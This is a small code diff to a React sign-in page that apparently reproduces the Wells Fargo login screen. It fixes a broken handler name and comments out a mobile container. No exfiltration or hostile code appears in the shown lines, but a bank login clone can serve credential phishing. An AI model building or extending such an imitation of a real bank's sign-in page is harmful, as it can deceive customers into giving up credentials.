@@ -23,7 +23,7 @@ const MainPage = () => {
     }));
   };
 
-  const handleSign on = async (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     if (!formData.userId || !formData.password) {
       alert("Please fill in all required fields.");
@@ -284,7 +284,7 @@ const MainPage = () => {
             style={{ top: 104 }}
           ></div>
         </div>
-        <div className="container-l3-mobile" id="containerL3Mobile" />
+        {/* <div className="container-l3-mobile" id="containerL3Mobile" /> */}
         <main className="ps-body-wrapper" style={{ paddingTop: 57 }}>
           <h1 className="hidden" id="skip">
             Wells Fargo
